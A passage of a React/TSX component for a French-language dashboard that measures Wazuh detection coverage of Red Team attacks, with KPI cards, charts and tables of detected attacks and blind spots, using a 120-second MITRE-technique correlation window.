            <p className="mt-0.5 font-mono text-[10px] uppercase tracking-widest text-slate-400 dark:text-coffee-bean-200/35">Logique de corrélation Red Team ↔ Wazuh</p>
          </div>
        </div>

        <div className="grid grid-cols-1 gap-4 lg:grid-cols-3">
          {/* DETECTED */}
          <div className="rounded-xl border border-green-200 bg-green-50/50 p-4 dark:border-green-500/20 dark:bg-green-500/[0.04]">
            <div className="mb-3 flex items-center gap-2">
              <CheckCircle2 size={14} className="text-green-600 dark:text-green-400" />
              <p className="font-mono text-[10px] font-bold uppercase tracking-[0.25em] text-green-700 dark:text-green-300">Détectée</p>
            </div>
            <p className="font-mono text-[11px] leading-relaxed text-slate-600 dark:text-coffee-bean-100/85">
              Une alerte Wazuh est émise pour la <span className="font-bold text-slate-800 dark:text-coffee-bean-50">même technique MITRE</span> que l'attaque, dans une fenêtre de <span className="font-bold text-green-700 dark:text-green-300">120 secondes</span>.
            </p>
            <div className="mt-3 flex items-center gap-2 font-mono text-[10px] text-slate-500 dark:text-coffee-bean-200/55">
              <span className="rounded border border-red-200 bg-red-50 px-1.5 py-0.5 text-red-600 dark:border-red-500/30 dark:bg-red-500/10 dark:text-red-400">ATK</span>
              <ArrowRight size={11} className="text-green-600 dark:text-green-400" />
              <span className="rounded border border-blue-200 bg-blue-50 px-1.5 py-0.5 text-blue-600 dark:border-blue-500/30 dark:bg-blue-500/10 dark:text-blue-400">ALR</span>
              <span className="text-slate-400 dark:text-coffee-bean-200/35">≤ 120 s</span>
            </div>
          </div>

          {/* NO RULE */}
          <div className="rounded-xl border border-red-200 bg-red-50/50 p-4 dark:border-red-500/20 dark:bg-red-500/[0.04]">
            <div className="mb-3 flex items-center gap-2">
              <AlertCircle size={14} className="text-red-600 dark:text-red-400" />
              <p className="font-mono text-[10px] font-bold uppercase tracking-[0.25em] text-red-700 dark:text-red-300">Manquée — NO RULE</p>
            </div>
            <p className="font-mono text-[11px] leading-relaxed text-slate-600 dark:text-coffee-bean-100/85">
              Wazuh ne possède <span className="font-bold text-slate-800 dark:text-coffee-bean-50">aucune règle</span> pour cette technique. L'attaque passe inaperçue — aucun log n'est analysé.
            </p>
            <div className="mt-3 flex items-center gap-2 font-mono text-[10px] text-slate-500 dark:text-coffee-bean-200/55">
              <span className="rounded border border-red-200 bg-red-50 px-1.5 py-0.5 text-red-600 dark:border-red-500/30 dark:bg-red-500/10 dark:text-red-400">ATK</span>
              <ArrowRight size={11} className="text-red-500 dark:text-red-400" />
              <span className="rounded border border-slate-200 bg-slate-50 px-1.5 py-0.5 italic text-slate-400 dark:border-white/10 dark:bg-white/5 dark:text-coffee-bean-200/40">∅ alerte</span>
            </div>
          </div>

          {/* TIMEOUT */}
          <div className="rounded-xl border border-orange-200 bg-orange-50/50 p-4 dark:border-orange-500/20 dark:bg-orange-500/[0.04]">
            <div className="mb-3 flex items-center gap-2">
              <Clock size={14} className="text-orange-600 dark:text-orange-400" />
              <p className="font-mono text-[10px] font-bold uppercase tracking-[0.25em] text-orange-700 dark:text-orange-300">Manquée — TIMEOUT</p>
            </div>
            <p className="font-mono text-[11px] leading-relaxed text-slate-600 dark:text-coffee-bean-100/85">
              La règle existe et l'alerte est levée, mais <span className="font-bold text-slate-800 dark:text-coffee-bean-50">après les 120 s</span>. La détection est trop tardive pour être valide.
            </p>
            <div className="mt-3 flex items-center gap-2 font-mono text-[10px] text-slate-500 dark:text-coffee-bean-200/55">
              <span className="rounded border border-red-200 bg-red-50 px-1.5 py-0.5 text-red-600 dark:border-red-500/30 dark:bg-red-500/10 dark:text-red-400">ATK</span>
              <ArrowRight size={11} className="text-orange-500 dark:text-orange-400" />
              <span className="rounded border border-blue-200 bg-blue-50 px-1.5 py-0.5 text-blue-600 dark:border-blue-500/30 dark:bg-blue-500/10 dark:text-blue-400">ALR</span>
              <span className="text-orange-600 dark:text-orange-400">&gt; 120 s</span>
            </div>
          </div>
        </div>

        <div className="mt-4 flex items-center justify-between gap-3 border-t border-slate-100 pt-3 dark:border-white/[0.05]">
          <p className="font-mono text-[10px] uppercase tracking-widest text-slate-400 dark:text-coffee-bean-200/35">
            Score = détectées / total · objectif ≥ 80 %
          </p>
          <p className="font-mono text-[10px] tracking-widest text-slate-400 dark:text-coffee-bean-200/35">
            Fenêtre de corrélation : <span className="text-slate-600 dark:text-coffee-bean-100">120 s</span>
          </p>
        </div>
      </motion.div>

      {/* ── BENTO KPI GRID ─────────────────────────────────────────────────── */}
      <div className="grid grid-cols-4 grid-rows-2 gap-4" style={{ gridTemplateRows: "repeat(2, 140px)" }}>

        {/* Large — Speedometer */}
        <motion.div initial={{ opacity: 0, scale: 0.96 }} animate={{ opacity: 1, scale: 1 }} transition={{ duration: 0.5 }}
          className="col-span-2 row-span-2 overflow-hidden rounded-2xl border border-slate-200 bg-white p-5 shadow-sm dark:border-white/[0.07] dark:bg-black/40 dark:shadow-none">
          <div className="flex h-full flex-col">
            <div className="flex items-center justify-between">
              <p className="font-cinematic text-sm uppercase tracking-[0.22em] text-slate-800 dark:text-coffee-bean-50">Score Global</p>
              <div className="flex gap-3">
                {[{ color: "#22c55e", label: "0–33%" }, { color: "#eab308", label: "33–67%" }, { color: "#ef4444", label: "67–100%" }].map((z) => (
                  <span key={z.label} className="flex items-center gap-1 font-mono text-[9px] text-slate-400 dark:text-coffee-bean-200/40">
                    <span className="size-2 rounded-sm" style={{ backgroundColor: z.color }} />{z.label}
                  </span>
                ))}
              </div>
            </div>
            <div className="flex-1"><SpeedometerGauge value={kpi.coverage} /></div>
            <div className="flex justify-center gap-6 font-mono text-[9px] uppercase tracking-wider text-slate-400 dark:text-coffee-bean-200/35">
              <span>{kpi.detectedAttacks} détectées</span>
              <span className="text-slate-300 dark:text-night-bordeaux-500/60">·</span>
              <span>{kpi.missedAttacks} manquées</span>
              <span className="text-slate-300 dark:text-night-bordeaux-500/60">·</span>
              <span>{kpi.totalAttacks} total</span>
            </div>
          </div>
        </motion.div>

        {/* Blind Spots */}
        <motion.div initial={{ opacity: 0, y: 12 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.1 }}
          className="overflow-hidden rounded-2xl border border-red-100 bg-red-50 p-5 shadow-sm dark:border-red-500/15 dark:bg-red-950/25 dark:shadow-none">
          <div className="flex h-full flex-col justify-between">
            <div className="flex items-start justify-between">
              <p className="font-cinematic text-sm uppercase tracking-[0.22em] text-red-600 dark:text-red-300">Angles Morts</p>
              <AlertCircle size={16} className="text-red-400 dark:text-red-500/60" />
            </div>
            <div>
              <p className="font-mono text-4xl font-bold tabular-nums text-red-600 dark:text-red-400">{kpi.missedAttacks}</p>
              <p className="mt-1.5 font-mono text-[10px] text-red-400 dark:text-coffee-bean-200/40">{noRuleCount} NO_RULE · {timeoutCount} TIMEOUT</p>
            </div>
          </div>
        </motion.div>

        {/* MTTD */}
        <motion.div initial={{ opacity: 0, y: 12 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.15 }}
          className="overflow-hidden rounded-2xl border border-blue-100 bg-blue-50 p-5 shadow-sm dark:border-blue-500/15 dark:bg-blue-950/20 dark:shadow-none">
          <div className="flex h-full flex-col justify-between">
            <div className="flex items-start justify-between">
              <p className="font-cinematic text-sm uppercase tracking-[0.22em] text-blue-600 dark:text-blue-300">MTTD Moyen</p>
              <Clock size={16} className="text-blue-400 dark:text-blue-500/60" />
            </div>
            <div>
              <p className="font-mono text-4xl font-bold tabular-nums text-blue-600 dark:text-blue-400">{kpi.mttdAvg}s</p>
              <p className="mt-1.5 font-mono text-[10px] text-blue-400 dark:text-coffee-bean-200/40">Min {minDelay}s · Max {maxDelay}s</p>
            </div>
          </div>
        </motion.div>

        {/* Total Attacks */}
        <motion.div initial={{ opacity: 0, y: 12 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.2 }}
          className="overflow-hidden rounded-2xl border border-orange-100 bg-orange-50 p-5 shadow-sm dark:border-orange-500/15 dark:bg-orange-950/20 dark:shadow-none">
          <div className="flex h-full flex-col justify-between">
            <div className="flex items-start justify-between">
              <p className="font-cinematic text-sm uppercase tracking-[0.22em] text-orange-600 dark:text-orange-300">Total Attacks</p>
              <Target size={16} className="text-orange-400 dark:text-orange-500/60" />
            </div>
            <div>
              <p className="font-mono text-4xl font-bold tabular-nums text-orange-600 dark:text-orange-400">{kpi.totalAttacks}</p>
              <p className="mt-1.5 font-mono text-[10px] text-orange-400 dark:text-coffee-bean-200/40">{kpi.detectedAttacks} détectées · {kpi.missedAttacks} manquées</p>
            </div>
          </div>
        </motion.div>

        {/* Duration */}
        <motion.div initial={{ opacity: 0, y: 12 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.25 }}
          className="overflow-hidden rounded-2xl border border-purple-100 bg-purple-50 p-5 shadow-sm dark:border-purple-500/15 dark:bg-purple-950/20 dark:shadow-none">
          <div className="flex h-full flex-col justify-between">
            <div className="flex items-start justify-between">
              <p className="font-cinematic text-sm uppercase tracking-[0.22em] text-purple-600 dark:text-purple-300">Durée</p>
              <Activity size={16} className="text-purple-400 dark:text-purple-500/60" />
            </div>
            <div>
              <p className="font-mono text-4xl font-bold tabular-nums text-purple-600 dark:text-purple-400">{kpi.exerciseDuration}</p>
              <p className="mt-1.5 font-mono text-[10px] text-purple-400 dark:text-coffee-bean-200/40">14:00 – 14:28</p>
            </div>
          </div>
        </motion.div>

      </div>

      {/* ── CHARTS ROW ─────────────────────────────────────────────────────── */}
      <div className="grid grid-cols-1 gap-4 lg:grid-cols-2">

        {/* MTTD bar chart */}
        <div className="rounded-2xl border border-slate-200 bg-white p-5 shadow-sm dark:border-white/[0.06] dark:bg-black/20 dark:shadow-none dark:backdrop-blur-sm">
          <p className="mb-4 font-cinematic text-base uppercase tracking-[0.2em] text-slate-900 dark:text-coffee-bean-50">Délai de Détection par Événement</p>
          <div className="h-96">
            <ResponsiveContainer width="100%" height="100%">
              <BarChart data={DEMO_MTTD_BARS} barCategoryGap="18%" margin={{ top: 5, right: 10, left: 0, bottom: 90 }}>
                <CartesianGrid strokeDasharray="3 3" stroke={grid} vertical={false} />
                <XAxis
                  dataKey="name"
                  stroke={axis}
                  interval={0}
                  height={90}
                  tick={(props: { x: number; y: number; payload: { value: string } }) => (
                    <g transform={`translate(${props.x},${props.y})`}>
                      <text
                        x={0} y={0} dy={4}
                        textAnchor="end"
                        transform="rotate(-40)"
                        fill={tick}
                        fontSize={9}
                        fontFamily="JetBrains Mono"
                      >
                        {props.payload.value}
                      </text>
                    </g>
                  )}
                />
                <YAxis stroke={axis} tick={{ fill: tick, fontSize: 10, fontFamily: "JetBrains Mono" }} domain={[0, 130]} />
                <Tooltip content={mttdTooltip} />
                <ReferenceLine y={120} stroke="#ef4444" strokeDasharray="4 4"
                  label={{ value: "120s limite", position: "insideTopRight", fill: "#ef4444", fontSize: 10, fontFamily: "JetBrains Mono" }} />
                <Bar dataKey="delay" name="Délai (s)" radius={[4, 4, 0, 0]}>
                  {DEMO_MTTD_BARS.map((entry, i) => <Cell key={i} fill={delayColor(entry.delay, dark)} />)}
                </Bar>
              </BarChart>
            </ResponsiveContainer>
          </div>
          <div className="mt-3 flex flex-wrap gap-x-5 gap-y-1.5">
            <p className="mb-1 w-full font-mono text-[9px] uppercase tracking-widest text-slate-400 dark:text-coffee-bean-200/30">Légende — Qualité de détection</p>
            {[
              { l: "#16a34a", d: "#22c55e", label: "0–30s · Excellent" },
              { l: "#65a30d", d: "#84cc16", label: "30–60s · Bon" },
              { l: "#d97706", d: "#eab308", label: "60–90s · Passable" },
              { l: "#ea580c", d: "#f97316", label: "90–120s · Attention" },
            ].map((c) => (
              <span key={c.label} className="flex items-center gap-1.5 font-mono text-[10px] text-slate-500 dark:text-coffee-bean-200/50">
                <span className="size-2.5 rounded-sm" style={{ backgroundColor: dark ? c.d : c.l }} />{c.label}
              </span>
            ))}
          </div>
        </div>

        {/* Tool breakdown donut chart */}
        <div className="rounded-2xl border border-slate-200 bg-white p-5 shadow-sm dark:border-white/[0.06] dark:bg-black/20 dark:shadow-none dark:backdrop-blur-sm">
          <p className="mb-4 font-cinematic text-base uppercase tracking-[0.2em] text-slate-900 dark:text-coffee-bean-50">Détection par Outil Red Team</p>
          {(() => {
            const detectedByTool = Object.values(
              detected.reduce<Record<string, { name: string; attacks: number }>>((acc, d) => {
                const cur = acc[d.tool] ?? { name: d.tool, attacks: 0 };
                cur.attacks += 1;
                acc[d.tool] = cur;
                return acc;
              }, {})
            ).sort((a, b) => b.attacks - a.attacks);
            const totalDetected = detectedByTool.reduce((s, d) => s + d.attacks, 0);
            return (
          <div className="grid grid-cols-[1.4fr_1fr] items-center gap-2">
            <div className="relative h-60">
              <ResponsiveContainer width="100%" height="100%">
                <PieChart>
                  <Tooltip content={toolTooltip} />
                  <Pie
                    data={detectedByTool}
                    dataKey="attacks"
                    nameKey="name"
                    cx="50%" cy="50%"
                    innerRadius={62}
                    outerRadius={100}
                    paddingAngle={1}
                    stroke={dark ? "#0a0a0a" : "white"}
                    strokeWidth={2}
                    isAnimationActive
                    animationBegin={0}
                    animationDuration={1000}
                  >
                    {detectedByTool.map((d, i) => (
                      <Cell key={i} fill={TOOL_COLORS[d.name] ?? "#888"} />
                    ))}
                  </Pie>
                </PieChart>
              </ResponsiveContainer>
              {/* Center label */}
              <div className="pointer-events-none absolute inset-0 flex flex-col items-center justify-center">
                <p className="font-mono text-2xl font-bold tabular-nums text-slate-900 dark:text-coffee-bean-50">{totalDetected}</p>
                <p className="font-mono text-[10px] uppercase tracking-[0.2em] text-slate-400 dark:text-coffee-bean-200/45">Détectées</p>
              </div>
            </div>

            {/* Side legend */}
            <div className="flex flex-col gap-2">
              {detectedByTool.map((d) => {
                const color = TOOL_COLORS[d.name] ?? "#888";
                return (
                  <div key={d.name} className="flex items-center gap-2.5">
                    <span className="size-3 shrink-0 rounded-full" style={{ backgroundColor: color }} />
                    <span className="flex-1 truncate font-mono text-xs capitalize text-slate-700 dark:text-coffee-bean-100">{d.name}</span>
                    <span className="font-mono text-[10px] tabular-nums text-slate-400 dark:text-coffee-bean-200/45">{d.attacks}</span>
                  </div>
                );
              })}
            </div>
          </div>
            );
          })()}
        </div>
      </div>

      {/* ── Gate ───────────────────────────────────────────────────────────── */}
      {!demoMode ? <LiveEmptyState onToggle={toggleDemo} /> : (
        <>
          {/* ── SECTION 1 — ATTAQUES DÉTECTÉES ─────────────────────────────── */}
          <section className="space-y-5">
            <div className="flex items-end justify-between">
              <div>
                <div className="flex items-center gap-2.5">
                  <CheckCircle2 size={19} className="text-green-600 dark:text-green-400" />
                  <h2 className="font-cinematic text-2xl uppercase tracking-wider text-slate-900 dark:text-coffee-bean-50">Attaques Détectées</h2>
                </div>
                <p className="mt-1 font-mono text-xs text-slate-400 dark:text-coffee-bean-200/40">{detected.length} attaques corrélées — cliquer pour voir la preuve complète</p>
              </div>
              <div className="flex items-center gap-5">
                {[
                  { label: "Délai min", value: `${minDelay}s`, cls: "text-green-600 dark:text-green-400" },
                  { label: "Délai max", value: `${maxDelay}s`, cls: "text-orange-600 dark:text-orange-400" },
                  { label: "MTTD moy",  value: `${kpi.mttdAvg}s`, cls: "text-blue-600 dark:text-blue-400" },
                ].map((s, i) => (
                  <div key={s.label} className="flex items-center gap-5">
                    {i > 0 && <div className="h-8 w-px bg-slate-200 dark:bg-white/10" />}
                    <div className="text-right">
                      <p className="font-mono text-[9px] uppercase tracking-widest text-slate-400 dark:text-coffee-bean-200/30">{s.label}</p>
                      <p className={`font-mono text-sm font-bold ${s.cls}`}>{s.value}</p>
                    </div>
                  </div>
                ))}
              </div>
            </div>


            {/* Detected table */}
            <div className="relative overflow-hidden rounded-2xl border border-green-100 bg-white shadow-sm dark:border-green-500/10 dark:bg-black/20 dark:shadow-none dark:backdrop-blur-sm">
              <div className="absolute inset-x-0 top-0 h-0.5 bg-gradient-to-r from-transparent via-green-400 to-transparent dark:via-green-500/25" />
              <div className="border-b border-slate-100 px-5 py-3 dark:border-white/[0.05]">
                <div className="flex items-center justify-between">
                  <p className="font-cinematic text-base uppercase tracking-[0.2em] text-slate-900 dark:text-coffee-bean-50">Preuves de détection — {detected.length} corrélations</p>
                  <div className="flex items-center gap-1.5 font-mono text-[9px] uppercase tracking-widest text-slate-400 dark:text-coffee-bean-200/25"><Eye size={10} />Cliquer pour voir</div>
                </div>
              </div>
              <div className="overflow-x-auto">
                <table className="w-full">
                  <thead>
                    <tr className="border-b border-slate-100 dark:border-white/[0.04]">
                      {["ID", "Heure", "Outil", "Technique MITRE", "Délai de détection", "Sévérité Wazuh", ""].map((h) => (
                        <th key={h} className="py-2.5 px-3 text-left font-mono text-[9px] uppercase tracking-[0.25em] text-slate-400 first:pl-5 last:pr-5 dark:text-coffee-bean-200/25">{h}</th>
                      ))}
                    </tr>
                  </thead>
                  <tbody>{detected.map((atk, i) => <DrillDownRow key={atk.id} atk={atk} index={i} />)}</tbody>
                </table>
              </div>
              <div className="border-t border-slate-100 px-5 py-2.5 dark:border-white/[0.04]">
                <p className="font-mono text-[9px] uppercase tracking-widest text-slate-300 dark:text-coffee-bean-200/20">Corrélation MITRE ATT&CK — fenêtre 120s — {detected.length}/{kpi.totalAttacks} corrélées</p>
              </div>
            </div>
          </section>

          {/* ── SECTION 2 — ANGLES MORTS ───────────────────────────────────── */}
          <section className="space-y-5">
            <div className="flex items-end justify-between">
              <div>
                <div className="flex items-center gap-2.5">
                  <motion.span animate={{ opacity: [1, 0.25, 1] }} transition={{ duration: 1.4, repeat: Infinity }}
                    className="size-2 rounded-full bg-red-500 shadow-[0_0_7px_rgba(239,68,68,0.6)]" />
                  <h2 className="font-cinematic text-2xl uppercase tracking-wider text-slate-900 dark:text-coffee-bean-50">Angles Morts</h2>
                </div>
                <p className="mt-1 font-mono text-xs text-slate-400 dark:text-coffee-bean-200/40">{missed.length} attaques non détectées dans la fenêtre de corrélation (120s)</p>
              </div>
              <div className="flex items-center gap-3">
                <span className="inline-flex items-center gap-2 rounded-xl border border-red-200 bg-red-50 px-4 py-2 font-mono text-xs text-red-600 dark:border-red-500/25 dark:bg-red-500/[0.08] dark:text-red-400">
                  <AlertCircle size={13} />{noRuleCount} SANS RÈGLE
                </span>
                <span className="inline-flex items-center gap-2 rounded-xl border border-orange-200 bg-orange-50 px-4 py-2 font-mono text-xs text-orange-600 dark:border-orange-500/25 dark:bg-orange-500/[0.08] dark:text-orange-400">
                  <Clock size={13} />{timeoutCount} DÉLAI DÉPASSÉ
                </span>
              </div>
            </div>

            <div className="grid grid-cols-1 gap-4 lg:grid-cols-3">
              <div className="rounded-2xl border border-red-100 bg-red-50 p-5 dark:border-red-500/15 dark:bg-red-500/[0.04]">
                <div className="flex items-start gap-3">
                  <div className="flex size-10 shrink-0 items-center justify-center rounded-xl bg-red-100 dark:bg-red-500/12">
                    <AlertCircle size={17} className="text-red-600 dark:text-red-400" />
                  </div>
                  <div>
                    <p className="font-mono text-[10px] uppercase tracking-widest text-red-600 dark:text-red-400">SANS RÈGLE</p>
                    <p className="mt-1 font-mono text-2xl font-bold text-red-700 dark:text-red-300">{noRuleCount} attaques</p>
                    <p className="mt-2 font-mono text-[11px] leading-relaxed text-slate-500 dark:text-coffee-bean-200/50">Wazuh ne possède aucune règle pour ces techniques. L'attaque est invisible — aucun log analysé.</p>
                  </div>
                </div>
              </div>
              <div className="rounded-2xl border border-orange-100 bg-orange-50 p-5 dark:border-orange-500/15 dark:bg-orange-500/[0.04]">
                <div className="flex items-start gap-3">
                  <div className="flex size-10 shrink-0 items-center justify-center rounded-xl bg-orange-100 dark:bg-orange-500/12">
                    <Clock size={17} className="text-orange-600 dark:text-orange-400" />
                  </div>
                  <div>
                    <p className="font-mono text-[10px] uppercase tracking-widest text-orange-600 dark:text-orange-400">DÉLAI DÉPASSÉ</p>
                    <p className="mt-1 font-mono text-2xl font-bold text-orange-700 dark:text-orange-300">{timeoutCount} attaques</p>
                    <p className="mt-2 font-mono text-[11px] leading-relaxed text-slate-500 dark:text-coffee-bean-200/50">Alerte générée après la fenêtre de 120s. La règle existe — c'est la latence de détection qui pose problème.</p>
                  </div>
                </div>
              </div>
              <div className="rounded-2xl border border-slate-200 bg-slate-50 p-5 dark:border-white/[0.06] dark:bg-white/[0.02]">
                <p className="font-mono text-[10px] uppercase tracking-widest text-slate-400 dark:text-coffee-bean-200/35">Règle de corrélation</p>
                <div className="mt-3 space-y-2.5">
                  {["Même technique MITRE", "Alerte dans les 120 secondes"].map((r) => (
                    <div key={r} className="flex items-center gap-2.5">
                      <span className="size-1.5 shrink-0 rounded-full bg-green-500" />
                      <p className="font-mono text-[11px] text-slate-600 dark:text-coffee-bean-200/65">{r}</p>
                    </div>
                  ))}
                  <div className="mt-3 h-px bg-slate-200 dark:bg-white/5" />
                  <p className="font-mono text-[10px] leading-relaxed text-slate-400 dark:text-coffee-bean-200/35">Les deux conditions doivent être réunies pour compter une attaque comme détectée.</p>
                </div>
              </div>
            </div>

            {/* Blind spots table */}
            <div className="relative overflow-hidden rounded-2xl border border-red-100 bg-white shadow-sm dark:border-red-500/10 dark:bg-black/20 dark:shadow-none dark:backdrop-blur-sm">
              <div className="absolute inset-x-0 top-0 h-0.5 bg-gradient-to-r from-transparent via-red-400 to-transparent dark:via-red-500/30" />
              <div className="border-b border-slate-100 px-5 py-3 dark:border-white/[0.05]">
                <p className="font-cinematic text-base uppercase tracking-[0.2em] text-slate-900 dark:text-coffee-bean-50">Attaques — Angles Morts — {missed.length} non détectées</p>
              </div>
              <div className="overflow-x-auto">
                <table className="w-full">
                  <thead>
                    <tr className="border-b border-slate-100 dark:border-white/[0.04]">
                      {["ID", "Heure", "Outil", "Technique MITRE", "Commande", "Tentatives", "Raison de l'échec"].map((h) => (
                        <th key={h} className="py-2.5 px-3 text-left font-mono text-[9px] uppercase tracking-[0.25em] text-slate-400 first:pl-5 last:pr-5 dark:text-coffee-bean-200/25">{h}</th>
                      ))}
                    </tr>
                  </thead>
                  <tbody>{missed.map((atk, i) => <MissedRow key={atk.id} atk={atk} index={i} />)}</tbody>
                </table>
              </div>
              <div className="border-t border-slate-100 px-5 py-2.5 dark:border-white/[0.04]">
                <p className="font-mono text-[9px] uppercase tracking-widest text-slate-300 dark:text-coffee-bean-200/20">
                  {noRuleCount} × règle manquante — {timeoutCount} × délai dépassé — fenêtre 120s
                </p>
              </div>
            </div>
          </section>

        </>
      )}
    </div>
  );
}
